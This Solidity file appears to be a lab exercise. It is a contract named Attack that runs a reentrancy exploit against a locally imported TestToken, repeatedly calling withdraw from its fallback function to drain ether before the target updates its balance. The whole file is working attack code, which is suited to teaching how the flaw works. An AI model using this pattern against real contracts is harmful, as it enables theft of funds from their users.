pragma solidity^0.5.0;
import "./03_ERC20.sol";


contract Attack {


    TestToken public target;
    address payable targetAddress;


    constructor(address payable _TargetAddress) public payable {
        targetAddress = _TargetAddress;
        target = TestToken(_TargetAddress);
        

    }

    // Checking to see if the contract has any balance and we should attack
    function () external payable {
        if (targetAddress.balance >= 0.0001 ether) {
            target.withdraw(0.0001 ether);
        }
    }
    // The re-entrancy attack to take away the funds before the balance can be updated on the other contract
    function attack() public payable {
        targetAddress.call.value(msg.value)(abi.encodeWithSignature("deposit()"));
        target.withdraw(msg.value);
    }

    // Check the balance of this contract to see if we properly reduced the funds
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
